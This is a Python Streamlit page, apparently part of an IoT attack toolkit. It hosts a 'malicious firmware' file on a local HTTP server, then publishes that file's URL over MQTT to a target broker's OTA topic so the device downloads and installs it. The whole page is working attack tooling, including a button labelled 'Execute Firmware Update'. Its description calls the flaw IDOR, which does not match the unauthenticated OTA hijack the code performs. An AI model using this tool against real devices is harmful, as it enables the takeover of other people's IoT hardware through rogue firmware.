import streamlit as st
import subprocess
import os
import signal
import time
import socket
from utils import run_command

st.set_page_config(page_title="Insecure OTA Update", page_icon="📲")

st.header("📲 Insecure Firmware Update (OTA)")
st.markdown("This module demonstrates an **Insecure Direct Object Reference (IDOR)** in IoT OTA mechanisms. It hosts a local firmware file and commands the target to download it.")

# --- SECTION 1: HOSTING THE FIRMWARE ---
st.subheader("1. Host Malicious Firmware")

# Session state to manage the background server process
if "server_pid" not in st.session_state:
    st.session_state.server_pid = None

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # This doesn't actually connect but gets the interface IP
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP

col_serv1, col_serv2 = st.columns(2)

with col_serv1:
    firmware_dir = st.text_input("Firmware Directory Path", value="/home/kali/", help="Absolute path to the folder containing firmware.bin")
    server_port = st.number_input("Hosting Port", value=8080)

with col_serv2:
    st.write("### Server Status")
    if st.session_state.server_pid:
        st.success(f"✅ Active (PID: {st.session_state.server_pid})")
        if st.button("🛑 Stop Server"):
            try:
                os.kill(st.session_state.server_pid, signal.SIGTERM)
                st.session_state.server_pid = None
                st.rerun()
            except ProcessLookupError:
                st.session_state.server_pid = None
                st.warning("Process was already killed.")
                st.rerun()
    else:
        st.error("❌ Inactive")
        if st.button("🚀 Start Hosting"):
            if not os.path.exists(firmware_dir):
                st.error(f"Directory not found: {firmware_dir}")
            else:
                # Start python http module in background
                process = subprocess.Popen(
                    ["python3", "-m", "http.server", str(server_port)],
                    cwd=firmware_dir,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                st.session_state.server_pid = process.pid
                st.rerun()

# Display the URL for the attacker
kali_ip = get_local_ip()
payload_url = f"http://{kali_ip}:{server_port}/firmware.bin"
st.info(f"📍 Your Payload URL will be: `{payload_url}`")


# --- SECTION 2: TRIGGER THE UPDATE ---
st.markdown("---")
st.subheader("2. Trigger OTA via MQTT")

col_trig1, col_trig2 = st.columns(2)

with col_trig1:
    target_broker = st.text_input("Target MQTT Broker", "192.168.88.252")
    
with col_trig2:
    ota_topic = st.text_input("OTA Trigger Topic", "home/update/url")

# The payload is the URL we constructed above
st.code(f"Payload: {payload_url}", language="text")

if st.button("💀 Execute Firmware Update"):
    if not st.session_state.server_pid:
        st.warning("⚠️ Warning: Your HTTP server is NOT running. The target will fail to download the file.")
    
    # ⚠️ We explicitly wrap the values in double quotes as requested.
    # If ota_topic is 'home/update', this becomes '"home/update"'
    quoted_topic = f'"{ota_topic}"'
    quoted_payload = f'"{payload_url}"'
    
    # Construct the MQTT command
    # mosquitto_pub -h <IP> -t <TOPIC> -m <URL>
    command = [
        "mosquitto_pub",
        "-h", target_broker,
        "-t", ota_topic,
        "-m", f'"{payload_url}"'
    ]
    
    st.info(f"Injecting: Topic={quoted_topic} | Payload={quoted_payload}")
    run_command(command)
